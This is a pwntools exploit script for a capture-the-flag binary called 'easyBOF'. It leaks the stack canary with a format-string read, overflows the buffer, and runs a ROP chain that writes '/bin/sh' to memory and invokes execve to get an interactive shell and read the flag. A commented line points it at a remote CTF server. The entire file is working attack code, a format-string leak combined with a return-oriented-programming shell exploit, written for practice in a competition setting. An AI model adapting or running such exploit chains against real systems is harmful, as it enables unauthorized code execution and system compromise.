from pwn import *

p = process("./easyBOF")
# p = remote('ctf.adl.tw', 10005)

context.arch = 'amd64'

pop_rax = 0x00000000004517d7
pop_rdi = 0x00000000004018ca
pop_rsi = 0x000000000040f32e
pop_rdx = 0x00000000004017cf
mov_q_rdi_rsi = 0x000000000044d79f
syscall = 0x00000000004012d3
bss = 0x4c0000

# get canary
payload = "%13$p"
p.sendafter('> ', payload)
canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

# bof + canary
payload = b'a' * 0x18 + p64(canary)

# 蓋掉save rbp
payload += b'b' * 0x8

# ROP
payload += p64(pop_rdi)
payload += p64(bss)

payload += p64(pop_rsi)
payload += b"/bin/sh\0"

payload += p64(mov_q_rdi_rsi)

payload += p64(pop_rsi)
payload += p64( 0 )

payload += p64(pop_rdx)
payload += p64( 0 )

payload += p64(pop_rax)
payload += p64( 0x3b )

payload += p64(syscall)

p.sendlineafter('Show your BOF', payload)

p.sendline('\n')
p.sendline('cat /home/`whoami`/flag')

p.interactive()
